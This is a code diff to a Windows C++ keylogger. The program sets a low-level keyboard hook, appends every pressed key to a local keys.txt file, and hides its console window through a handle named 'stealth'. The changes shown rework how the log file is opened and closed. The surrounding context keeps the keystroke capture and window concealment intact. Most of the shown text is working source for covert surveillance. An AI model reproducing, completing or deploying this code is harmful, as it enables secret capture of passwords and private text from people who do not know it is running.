@@ -1,10 +1,15 @@
 #define _WIN32_WINNT 0x0500
 #include <fstream>
 #include <windows.h>
+
 using namespace std;
-ofstream out("keys.txt", ios::out);
+
+ofstream out;
+
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
+    out.open("./keys.txt", ios::app);
+
     PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
 
     // If key is being pressed
@@ -57,8 +62,12 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
             out << char(tolower(p->vkCode));
         }
     }
+
+    out.close();
+
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
 {
 
@@ -66,6 +75,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(stealth, 0);
+    
     // Set windows hook
     HHOOK keyboardHook = SetWindowsHookEx(
         WH_KEYBOARD_LL,
@@ -74,6 +84,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         0);
 
     MSG messages;
+
     while (GetMessage(&messages, NULL, 0, 0))
     {
         /* Translate virtual-key messages into character messages */
